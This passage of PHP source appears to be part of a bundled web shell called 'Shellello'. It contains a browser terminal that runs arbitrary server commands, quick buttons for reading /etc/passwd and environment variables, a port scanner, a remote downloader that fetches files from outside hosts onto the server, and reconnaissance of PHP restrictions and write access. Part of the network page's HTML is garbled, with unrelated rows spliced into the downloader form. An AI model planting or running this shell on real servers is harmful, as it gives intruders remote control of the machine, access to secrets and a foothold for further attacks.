 * Shellello - Module 10: Terminal Page
 */

function renderTerminal() {
    $cwd = getcwd();
    $user = get_current_user();
    $hostname = php_uname('n');
    $processUser = posix_getpwuid(posix_geteuid())['name'] ?? $user; // Actual process user (e.g., www-data)
    
    ob_start();
?>
<style>
.terminal-card { padding: 0 !important; overflow: hidden; background: #0d1117; }
.terminal-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 0.75rem 1rem;
    background: #161b22;
    border-bottom: 1px solid #30363d;
}
.terminal-title { display: flex; align-items: center; gap: 0.5rem; }
.terminal-dot { width: 12px; height: 12px; border-radius: 50%; }
.terminal-dot.red { background: #ff5f56; }
.terminal-dot.yellow { background: #ffbd2e; }
.terminal-dot.green { background: #27c93f; }
.terminal-title-text { margin-left: 0.75rem; color: #8b949e; font-size: 0.85rem; }
.terminal-body {
    height: 450px;
    overflow-y: auto;
    padding: 1rem;
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 0.9rem;
    line-height: 1.6;
    color: #c9d1d9;
}
.terminal-welcome { color: #58a6ff; margin-bottom: 1rem; }
.terminal-welcome pre { margin: 0; font-size: 0.8rem; }
.terminal-line { margin-bottom: 0.25rem; }
.terminal-line .prompt { color: #7ee787; }
.terminal-line .command { color: #f0f6fc; }
.terminal-line .output { color: #8b949e; white-space: pre-wrap; word-break: break-all; }
.terminal-line .error { color: #f85149; }
.terminal-line .info { color: #58a6ff; }
.terminal-input-container {
    display: flex;
    align-items: center;
    padding: 0.75rem 1rem;
    background: #161b22;
    border-top: 1px solid #30363d;
}
.terminal-prompt {
    color: #7ee787;
    font-family: 'Consolas', monospace;
    font-size: 0.9rem;
    margin-right: 0.5rem;
    white-space: nowrap;
}
.terminal-input {
    flex: 1;
    background: transparent;
    border: none;
    color: #f0f6fc;
    font-family: 'Consolas', monospace;
    font-size: 0.9rem;
    outline: none;
}
.quick-cmd-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
    gap: 0.5rem;
}
.quick-cmd {
    padding: 0.5rem 0.75rem;
    background: var(--card-muted);
    border: 1px solid var(--border);
    border-radius: 6px;
    font-family: 'Consolas', monospace;
    font-size: 0.85rem;
    cursor: pointer;
    text-align: center;
}
.quick-cmd:hover { background: #1f2937; }
.card-header { display: flex; align-items: center; gap: 0.75rem; margin-bottom: 1rem; padding-bottom: 1rem; border-bottom: 1px solid #e5e7eb; }
.card-header h3 { margin: 0; font-size: 1.1rem; }
.card-icon { font-size: 1.5rem; }
</style>

<div class="terminal-container">
    <div class="card terminal-card">
        <div class="terminal-header">
            <div class="terminal-title">
                <span class="terminal-dot red"></span>
                <span class="terminal-dot yellow"></span>
                <span class="terminal-dot green"></span>
                <span class="terminal-title-text">Terminal - <?php echo htmlspecialchars($hostname); ?></span>
            </div>
            <button class="btn btn-sm btn-secondary" onclick="clearTerm()">Clear</button>
        </div>
        <div class="terminal-body" id="termOutput">
            <div class="terminal-welcome">
                <pre>╔═══════════════════════════════════════════════════════════╗
║  <?php echo str_pad(APP_NAME . ' Terminal v' . APP_VERSION, 55); ?> ║
║  Type 'help' for available commands                       ║
╚═══════════════════════════════════════════════════════════╝</pre>
            </div>
        </div>
        <div class="terminal-input-container">
            <span class="terminal-prompt" id="termPrompt"><?php echo htmlspecialchars($user . '@' . $hostname . ':' . $cwd); ?>$</span>
            <input type="text" id="termInput" class="terminal-input" placeholder="Enter command..." autofocus autocomplete="off">
        </div>
    </div>

    <div class="card" style="margin-top: 1.5rem;">
        <div class="card-header">
            <span class="card-icon">⚡</span>
            <h3>Quick Commands</h3>
        </div>
        <div class="card-body">
            <div class="quick-cmd-grid">
                <button class="quick-cmd" onclick="runCmd('whoami')">whoami</button>
                <button class="quick-cmd" onclick="runCmd('id')">id</button>
                <button class="quick-cmd" onclick="runCmd('pwd')">pwd</button>
                <button class="quick-cmd" onclick="runCmd('ls -la')">ls -la</button>
                <button class="quick-cmd" onclick="runCmd('uname -a')">uname -a</button>
                <button class="quick-cmd" onclick="runCmd('cat /etc/passwd')">cat /etc/passwd</button>
                <button class="quick-cmd" onclick="runCmd('ps aux')">ps aux</button>
                <button class="quick-cmd" onclick="runCmd('netstat -tulpn')">netstat -tulpn</button>
                <button class="quick-cmd" onclick="runCmd('df -h')">df -h</button>
                <button class="quick-cmd" onclick="runCmd('free -m')">free -m</button>
                <button class="quick-cmd" onclick="runCmd('cat /etc/os-release')">OS Info</button>
                <button class="quick-cmd" onclick="runCmd('env')">env</button>
            </div>
        </div>
    </div>
</div>

<script>
var cwd = <?php echo json_encode($cwd); ?>;
var cmdHistory = [];
var histIdx = -1;
var user = <?php echo json_encode($user); ?>;
var hostname = <?php echo json_encode($hostname); ?>;

document.addEventListener('DOMContentLoaded', function() {
    var input = document.getElementById('termInput');
    
    input.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            var cmd = this.value.trim();
            if (cmd) {
                execCmd(cmd);
                cmdHistory.unshift(cmd);
                histIdx = -1;
            }
            this.value = '';
        } else if (e.key === 'ArrowUp') {
            e.preventDefault();
            if (histIdx < cmdHistory.length - 1) {
                histIdx++;
                this.value = cmdHistory[histIdx];
            }
        } else if (e.key === 'ArrowDown') {
            e.preventDefault();
            if (histIdx > 0) {
                histIdx--;
                this.value = cmdHistory[histIdx];
            } else {
                histIdx = -1;
                this.value = '';
            }
        } else if (e.ctrlKey && e.key === 'l') {
            e.preventDefault();
            clearTerm();
        }
    });
    
    document.getElementById('termOutput').addEventListener('click', function() {
        input.focus();
    });
});

function execCmd(cmd) {
    addLine(getPrompt(), cmd, 'command');
    
    if (cmd === 'clear') { clearTerm(); return; }
    if (cmd === 'help') { showHelp(); return; }
    if (cmd.startsWith('cd ')) { changeDir(cmd.substring(3).trim()); return; }
    
    var fd = new FormData();
    fd.append('cmd', cmd);
    fd.append('cwd', cwd);
    
    fetch('?action=exec_cmd', {method:'POST', body:fd})
        .then(function(r) { return r.json(); })
        .then(function(data) {
            if (data.status === 'success') {
                if (data.output) addLine('', data.output, 'output');
                if (data.cwd && data.cwd !== cwd) {
                    cwd = data.cwd;
                    updatePrompt();
                }
            } else {
                addLine('', data.message, 'error');
            }
            scrollDown();
        });
}

function changeDir(dir) {
    var fd = new FormData();
    fd.append('cmd', 'cd ' + dir + ' && pwd');
    fd.append('cwd', cwd);
    
    fetch('?action=exec_cmd', {method:'POST', body:fd})
        .then(function(r) { return r.json(); })
        .then(function(data) {
            if (data.status === 'success' && data.output) {
                cwd = data.output.trim();
                updatePrompt();
            } else {
                addLine('', 'cd: ' + dir + ': No such directory', 'error');
            }
            scrollDown();
        });
}

function getPrompt() { return user + '@' + hostname + ':' + cwd + '$'; }
function updatePrompt() { document.getElementById('termPrompt').textContent = getPrompt(); }

function addLine(prompt, text, type) {
    var out = document.getElementById('termOutput');
    var line = document.createElement('div');
    line.className = 'terminal-line';
    var html = '';
    if (prompt) html += '<span class="prompt">' + esc(prompt) + '</span> ';
    html += '<span class="' + type + '">' + esc(text) + '</span>';
    line.innerHTML = html;
    out.appendChild(line);
}

function showHelp() {
    var help = 'Available commands:\n  help     - Show this help\n  clear    - Clear screen\n  cd <dir> - Change directory\n  [cmd]    - Execute shell command\n\nKeyboard:\n  Up/Down  - Command history\n  Ctrl+L   - Clear screen';
    addLine('', help, 'info');
    scrollDown();
}

function clearTerm() { document.getElementById('termOutput').innerHTML = ''; }
function scrollDown() {
    var out = document.getElementById('termOutput');
    out.scrollTop = out.scrollHeight;
}

function runCmd(cmd) {
    document.getElementById('termInput').value = cmd;
    execCmd(cmd);
}

function esc(s) {
    var div = document.createElement('div');
    div.textContent = s;
    return div.innerHTML;
}
</script>
<?php
    $content = ob_get_clean();
    renderLayout('Terminal', $content, 'terminal');
}

// ========== 11_NETWORK ==========
/**
 * Shellello - Module 11: Network Toolkit
 */

function renderNetwork() {
    $defaultPorts = '21,22,23,25,53,80,110,135,139,143,443,445,465,587,993,995,1433,1521,2049,3306,3389,5432,5900,6379,8080,8443,9000,11211,27017';
    ob_start();
?>
<style>
.network-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(340px, 1fr)); gap: 1.5rem; }
.card-body { display: flex; flex-direction: column; gap: 0.75rem; }
.form-group { display: flex; flex-direction: column; gap: 0.35rem; }
.form-group label { font-weight: 500; color: var(--text); }
.section-header { display: flex; align-items: center; gap: 0.75rem; margin-bottom: 1rem; padding-bottom: 1rem; border-bottom: 1px solid var(--border); }
.section-header h3 { margin: 0; font-size: 1.1rem; }
.hint { color: var(--text-muted); font-size: 0.9rem; }
.result-box {
    background: var(--card-muted);
    border: 1px solid var(--border);
    border-radius: 10px;
    padding: 1rem;
    max-height: 280px;
    overflow-y: auto;
    font-family: 'Consolas', monospace;
    font-size: 0.9rem;
}
.status-pill { display: inline-flex; align-items: center; gap: 0.35rem; padding: 0.25rem 0.65rem; border-radius: 999px; font-size: 0.85rem; }
.pill-open { background: rgba(34,197,94,0.15); color: #34d399; border: 1px solid rgba(34,197,94,0.45); }
.pill-closed { background: rgba(248,113,113,0.15); color: #fca5a5; border: 1px solid rgba(248,113,113,0.4); }
.flex-row { display: flex; gap: 0.75rem; flex-wrap: wrap; align-items: center; }
</style>

<div class="network-grid">
    <div class="card">
        <div class="section-header">
            <span style="font-size:1.4rem;">🛰️</span>
            <h3>Port Scanner</h3>
        </div>
        <div class="card-body">
            <div class="form-group">
                <label>Target IP / Host</label>
                <input type="text" id="scanTarget" class="form-control" placeholder="192.168.0.10 or example.com">
            </div>
            <div class="form-group">
                <label>Ports</label>
                <textarea id="scanPorts" class="form-control" rows="3" placeholder="Comma or space separated list. Leave empty to use common ports."></textarea>
                <div class="hint">Default: <?php echo htmlspecialchars($defaultPorts); ?></div>
            </div>
            <div class="flex-row" style="margin-top:0.5rem;">
                <button class="btn btn-primary" onclick="scanPorts()" id="scanBtn">🔍 Scan</button>
                <button class="btn btn-secondary" onclick="fillDefaultPorts()">Use Default</button>
                <span id="scanSummary" class="text-muted"></span>
            </div>
            <div id="scanResult" class="result-box" style="margin-top:1rem;">Awaiting scan...</div>
        </div>
    </div>

    <div class="card">
        <div class="section-header">
            <span style="font-size:1.4rem;">⬇️</span>
            <h3>Remote Downloader</h3>
        </div>
        <div class="card-body">
            <div class="form-group">
                <label>Protocol</label>
                <div class="flex-row">
                    <span class="info-label">Session Duration</span>
                    <span class="info-value">&lt;?php echo getSessionTime(); ?&gt;</span>
                </div>
            </div>
                    <span class="info-label">Client IP</span>
                    <span class="info-value">&lt;?php echo getClientIp(); ?&gt;</span>
                </div>
                <div class="info-row">
                    <span class="info-label">Server IP</span>
                    <span class="info-value">&lt;?php echo getServerIp(); ?&gt;</span>
                <input type="text" id="dlHost" class="form-control" placeholder="example.com">
            </div>
            <div class="form-group">
                <label>Port</label>
                <input type="number" id="dlPort" class="form-control" value="80" min="1" max="65535">
            </div>
            <div class="form-group">
                <label>Path</label>
                <input type="text" id="dlPath" class="form-control" placeholder="/file.txt">
            </div>
            <div class="form-group">
                <label>Save to (optional)</label>
                <input type="text" id="dlSave" class="form-control" placeholder="/tmp/file.txt (defaults to current dir)">
            </div>
            <div class="flex-row" style="margin-top:0.5rem;">
                <button class="btn btn-primary" onclick="remoteDownload()" id="dlBtn">⬇️ Download</button>
                <span id="dlStatus" class="text-muted"></span>
            </div>
            <div id="dlResult" class="result-box" style="margin-top:1rem;">No downloads yet.</div>
        </div>
    </div>
</div>

<script>
var defaultPorts = <?php echo json_encode($defaultPorts); ?>;

function fillDefaultPorts() {
    document.getElementById('scanPorts').value = defaultPorts;
}

function scanPorts() {
    var target = document.getElementById('scanTarget').value.trim();
    if (!target) { toast('Enter a target first', 'error'); return; }
    var btn = document.getElementById('scanBtn');
    btn.disabled = true;
    btn.textContent = 'Scanning...';
    document.getElementById('scanSummary').textContent = '';
    document.getElementById('scanResult').textContent = 'Scanning...';

    var fd = new FormData();
    fd.append('target', target);
    fd.append('ports', document.getElementById('scanPorts').value);
    fetch('?action=scan_ports', {method:'POST', body:fd})
        .then(function(r) { return r.json(); })
        .then(function(data) {
            btn.disabled = false;
            btn.textContent = '🔍 Scan';
            if (data.status === 'success') {
                renderScan(data.results || []);
                document.getElementById('scanSummary').textContent = data.open + ' open / ' + data.checked + ' checked';
            } else {
                document.getElementById('scanResult').textContent = data.message || 'Scan failed';
            }
        })
        .catch(function(err) {
            btn.disabled = false;
            btn.textContent = '🔍 Scan';
            document.getElementById('scanResult').textContent = err.message;
        });
}

function renderScan(list) {
    if (!list.length) { document.getElementById('scanResult').textContent = 'No results'; return; }
    var rows = list.map(function(item) {
        var pill = item.status === 'open' ? '<span class="status-pill pill-open">OPEN</span>' : '<span class="status-pill pill-closed">closed</span>';
        var latency = item.latency_ms ? item.latency_ms + ' ms' : '-';
        return 'Port ' + item.port + ' ' + pill + ' <span class="text-muted">' + latency + '</span>';
    });
    document.getElementById('scanResult').innerHTML = rows.join('<br>');
}

function remoteDownload() {
    var host = document.getElementById('dlHost').value.trim();
    var port = document.getElementById('dlPort').value.trim();
    var path = document.getElementById('dlPath').value.trim();
    if (!host || !port || !path) { toast('Host, port, and path are required', 'error'); return; }
    var btn = document.getElementById('dlBtn');
    btn.disabled = true;
    btn.textContent = 'Downloading...';
    document.getElementById('dlStatus').textContent = '';
    document.getElementById('dlResult').textContent = 'Attempting download...';

    var fd = new FormData();
    fd.append('host', host);
    fd.append('port', port);
    fd.append('path', path);
    fd.append('save_path', document.getElementById('dlSave').value.trim());
    var scheme = document.querySelector('input[name="scheme"]:checked');
    fd.append('scheme', scheme ? scheme.value : 'http');

    fetch('?action=remote_download', {method:'POST', body:fd})
        .then(function(r) { return r.json(); })
        .then(function(data) {
            btn.disabled = false;
            btn.textContent = '⬇️ Download';
            if (data.status === 'success') {
                var msg = 'Saved to: ' + data.saved_to + '\nMethod: ' + data.method + '\nSize: ' + data.size + '\nURL: ' + data.url;
                document.getElementById('dlResult').textContent = msg;
                document.getElementById('dlStatus').textContent = data.message;
                toast('Downloaded via ' + data.method, 'success');
            } else {
                document.getElementById('dlResult').textContent = data.message || 'Download failed';
                document.getElementById('dlStatus').textContent = 'Error';
                toast(data.message || 'Download failed', 'error');
            }
        })
        .catch(function(err) {
            btn.disabled = false;
            btn.textContent = '⬇️ Download';
            document.getElementById('dlResult').textContent = err.message;
        });
}

function toast(msg, type) {
    var t = document.getElementById('toast');
    if (!t) {
        t = document.createElement('div');
        t.id = 'toast';
        t.style.cssText = 'position:fixed;bottom:2rem;right:2rem;padding:1rem 1.5rem;border-radius:8px;color:#fff;font-weight:500;z-index:9999;transition:opacity 0.3s;box-shadow:0 10px 25px rgba(0,0,0,0.2);';
        document.body.appendChild(t);
    }
    t.textContent = msg;
    t.style.background = type === 'error' ? '#ef4444' : '#22c55e';
    t.style.opacity = '1';
    setTimeout(function() { t.style.opacity = '0'; }, 3000);
}
</script>
<?php
    $content = ob_get_clean();
    renderLayout('Network', $content, 'network');
}

// ========== 12_SETTINGS ==========
/**
 * Shellello - Module 12: Settings Page
 */

function renderSettings() {
    $phpInfo = [
        'Version' => phpversion(),
        'SAPI' => php_sapi_name(),
        'OS' => PHP_OS,
        'Max Execution Time' => ini_get('max_execution_time') . 's',
        'Memory Limit' => ini_get('memory_limit'),
        'Upload Max Filesize' => ini_get('upload_max_filesize'),
        'Post Max Size' => ini_get('post_max_size'),
        'Display Errors' => ini_get('display_errors') ? 'On' : 'Off',
        'Open Basedir' => ini_get('open_basedir') ?: 'None',
        'Disabled Functions' => ini_get('disable_functions') ?: 'None'
    ];
    
    $extensions = get_loaded_extensions();
    sort($extensions);
    
    ob_start();
?>
<style>
.config-grid { display: grid; gap: 0.75rem; }
.config-item {
    display: flex;
    justify-content: space-between;
    align-items: flex-start;
    padding: 0.75rem;
    background: var(--card-muted);
    border-radius: 8px;
    gap: 1rem;
}
.config-label { font-weight: 500; color: var(--text); white-space: nowrap; }
.config-value {
    color: var(--text-muted);
    text-align: right;
    word-break: break-all;
    font-family: 'Consolas', monospace;
    font-size: 0.9rem;
}
.extensions-grid { display: flex; flex-wrap: wrap; gap: 0.5rem; }
.extension-badge {
    padding: 0.25rem 0.75rem;
    background: #1f2937;
    color: #c4d4ff;
    border-radius: 20px;
    font-size: 0.8rem;
    font-weight: 500;
}
.tools-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
    gap: 1rem;
}
.tool-card {
    padding: 1.25rem;
    background: var(--card-muted);
    border-radius: 12px;
    cursor: pointer;
    transition: all 0.2s;
    border: 2px solid transparent;
    text-align: center;
}
.tool-card:hover {
    background: #111827;
    border-color: var(--primary);
    transform: translateY(-2px);
}
.tool-icon { font-size: 2rem; display: block; margin-bottom: 0.75rem; }
.tool-card h4 { margin: 0 0 0.5rem 0; font-size: 1rem; color: #1f2937; }
.tool-card p { margin: 0; font-size: 0.85rem; color: #6b7280; }
.modal-overlay {
    display: none;
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    background: rgba(0,0,0,0.5);
    z-index: 1000;
    align-items: center;
    justify-content: center;
}
.modal-overlay.show { display: flex; }
.modal {
    background: var(--card-bg);
    border-radius: 12px;
    width: 90%;
    max-width: 500px;
    box-shadow: 0 25px 50px rgba(0,0,0,0.35);
    border: 1px solid var(--border);
}
.modal-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 1rem 1.5rem;
    border-bottom: 1px solid var(--border);
}
.modal-header h3 { margin: 0; font-size: 1.1rem; }
.modal-close { background: none; border: none; font-size: 1.5rem; cursor: pointer; color: var(--text-muted); }
.modal-body { padding: 1.5rem; }
.modal-body label { display: block; margin-bottom: 0.5rem; font-weight: 500; }
.modal-body .form-control { width: 100%; }
.modal-footer {
    display: flex;
    justify-content: flex-end;
    gap: 0.75rem;
    padding: 1rem 1.5rem;
    border-top: 1px solid var(--border);
    background: var(--card-muted);
    border-radius: 0 0 12px 12px;
}
.hash-result { margin-top: 1rem; padding-top: 1rem; border-top: 1px solid var(--border); }
.hash-display {
    display: flex;
    align-items: center;
    gap: 0.75rem;
    background: #1e293b;
    padding: 0.75rem 1rem;
    border-radius: 8px;
    margin-top: 0.5rem;
}
.hash-display code { flex: 1; color: #22c55e; font-size: 0.85rem; word-break: break-all; }
.card-header { display: flex; align-items: center; gap: 0.75rem; margin-bottom: 1rem; padding-bottom: 1rem; border-bottom: 1px solid #e5e7eb; }
.card-header h3 { margin: 0; font-size: 1.1rem; }
.card-icon { font-size: 1.5rem; }
</style>

<div class="settings-container">
    <div class="card">
        <div class="card-header">
            <span class="card-icon">🐘</span>
            <h3>PHP Configuration</h3>
        </div>
        <div class="card-body">
            <div class="config-grid">
                <?php foreach ($phpInfo as $key => $value): ?>
                <div class="config-item">
                    <span class="config-label"><?php echo htmlspecialchars($key); ?></span>
                    <span class="config-value"><?php echo htmlspecialchars($value); ?></span>
                </div>
                <?php endforeach; ?>
            </div>
        </div>
    </div>

    <div class="card">
        <div class="card-header">
            <span class="card-icon">🧩</span>
            <h3>Loaded Extensions (<?php echo count($extensions); ?>)</h3>
        </div>
        <div class="card-body">
            <div class="extensions-grid">
                <?php foreach ($extensions as $ext): ?>
                <span class="extension-badge"><?php echo htmlspecialchars($ext); ?></span>
                <?php endforeach; ?>
            </div>
        </div>
    </div>

    <div class="card">
        <div class="card-header">
            <span class="card-icon">🖥️</span>
            <h3>Server Variables</h3>
        </div>
        <div class="card-body">
            <div class="config-grid">
                <div class="config-item">
                    <span class="config-label">Server Software</span>
                    <span class="config-value"><?php echo htmlspecialchars(getServerSoftware()); ?></span>
                </div>
                <div class="config-item">
                    <span class="config-label">Document Root</span>
                    <span class="config-value"><?php echo htmlspecialchars($_SERVER['DOCUMENT_ROOT'] ?? 'N/A'); ?></span>
                </div>
                <div class="config-item">
                    <span class="config-label">Script Path</span>
                    <span class="config-value"><?php echo htmlspecialchars($_SERVER['SCRIPT_FILENAME'] ?? 'N/A'); ?></span>
                </div>
                <div class="config-item">
                    <span class="config-label">Remote Address</span>
                    <span class="config-value"><?php echo htmlspecialchars($_SERVER['REMOTE_ADDR'] ?? 'N/A'); ?></span>
                </div>
            </div>
        </div>
    </div>

    <div class="card">
        <div class="card-header">
            <span class="card-icon">🔧</span>
            <h3>Tools</h3>
        </div>
        <div class="card-body">
            <div class="tools-grid">
                <div class="tool-card" onclick="showModal('hashModal')">
                    <span class="tool-icon">🔐</span>
                    <h4>Generate Password Hash</h4>
                    <p>Create SHA-256 hash</p>
                </div>
                <div class="tool-card" onclick="window.open('?action=phpinfo','_blank')">
                    <span class="tool-icon">ℹ️</span>
                    <h4>PHP Info</h4>
                    <p>Full PHP configuration</p>
                </div>
                <div class="tool-card" onclick="testWrite()">
                    <span class="tool-icon">✍️</span>
                    <h4>Test Write Access</h4>
                    <p>Check permissions</p>
                </div>
            </div>
        </div>
    </div>

    <div class="modal-overlay" id="hashModal">
        <div class="modal">
            <div class="modal-header">
                <h3>🔐 Generate Password Hash</h3>
                <button class="modal-close" onclick="closeModal('hashModal')">&times;</button>
            </div>
            <div class="modal-body">
                <label>Enter Password:</label>
                <input type="password" id="hashPassword" class="form-control" placeholder="Your password">
                <div id="hashResult" class="hash-result" style="display:none;">
                    <label>SHA-256 Hash:</label>
                    <div class="hash-display">
                        <code id="hashValue"></code>
                        <button class="btn btn-sm btn-secondary" onclick="copyHash()">📋</button>
                    </div>
                    <p class="text-muted" style="margin-top:0.5rem;font-size:0.85rem;">Set this as AUTH_HASH in the config.</p>
                </div>
            </div>
            <div class="modal-footer">
                <button class="btn btn-secondary" onclick="closeModal('hashModal')">Close</button>
                <button class="btn btn-primary" onclick="genHash()">Generate</button>
            </div>
        </div>
    </div>
</div>

<script>
function showModal(id) { document.getElementById(id).classList.add('show'); }
function closeModal(id) { document.getElementById(id).classList.remove('show'); }

async function genHash() {
    var pw = document.getElementById('hashPassword').value;
    if (!pw) { toast('Enter a password', 'error'); return; }
    
    var enc = new TextEncoder();
    var data = enc.encode(pw);
    var buf = await crypto.subtle.digest('SHA-256', data);
    var arr = Array.from(new Uint8Array(buf));
    var hex = arr.map(function(b) { return b.toString(16).padStart(2, '0'); }).join('');
    
    document.getElementById('hashValue').textContent = hex;
    document.getElementById('hashResult').style.display = 'block';
}

function copyHash() {
    var hash = document.getElementById('hashValue').textContent;
    navigator.clipboard.writeText(hash).then(function() {
        toast('Copied!', 'success');
    });
}

function testWrite() {
    var fd = new FormData();
    fd.append('path', '<?php echo getcwd(); ?>');
    fd.append('name', '.write_test_' + Date.now());
    
    fetch('?action=create_file', {method:'POST', body:fd})
        .then(function(r) { return r.json(); })
        .then(function(data) {
            if (data.status === 'success') {
                toast('Write access OK!', 'success');
            } else {
                toast('Write access DENIED', 'error');
            }
        });
}

function toast(msg, type) {
    var t = document.getElementById('toast');
    if (!t) {
        t = document.createElement('div');
        t.id = 'toast';
        t.style.cssText = 'position:fixed;bottom:2rem;right:2rem;padding:1rem 1.5rem;border-radius:8px;color:#fff;font-weight:500;z-index:9999;transition:opacity 0.3s;';
        document.body.appendChild(t);
    }
    t.textContent = msg;
    t.style.background = type === 'error' ? '#ef4444' : '#22c55e';
    t.style.opacity = '1';
    setTimeout(function() { t.style.opacity = '0'; }, 3000);
}
</script>
<?php
    $content = ob_get_clean();
    renderLayout('Settings', $content, 'settings');
}

// ========== 13_ROUTER ==========
/**
 * Shellello - Module 13: Main Router
 */

function main() {
    // Handle logout
    if (isset($_GET['logout'])) {
        logout();
    }

    // Handle API actions (AJAX requests)
    if (isset($_GET['action'])) {
        if (!isAuthenticated()) {
            header('Content-Type: application/json');
            echo json_encode(['status' => 'error', 'message' => 'Not authenticated']);
            exit;
        }
        handleApiAction($_GET['action']);
        return;
    }

    // Handle authentication
    if (!isAuthenticated()) {
        $error = null;
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['password'] ?? null)) {
            if (attemptLogin($_POST['password'])) {
                header("Location: ?page=dashboard");
                exit;
            } else {
                $error = 'Invalid password. Please try again.';
            }
        }
        renderLogin($error);
        return;
    }

    // Route to pages
    $page = $_GET['page'] ?? 'dashboard';
    
    switch ($page) {
        case 'files':
            renderFileManager();
            break;
        case 'database':
            renderDatabase();
            break;
        case 'terminal':
            renderTerminal();
            break;
        case 'network':
            renderNetwork();
            break;
        case 'settings':
            renderSettings();
            break;
        case 'dashboard':
        default:
            renderDashboard();
            break;
    }
}

// Run the application
main();
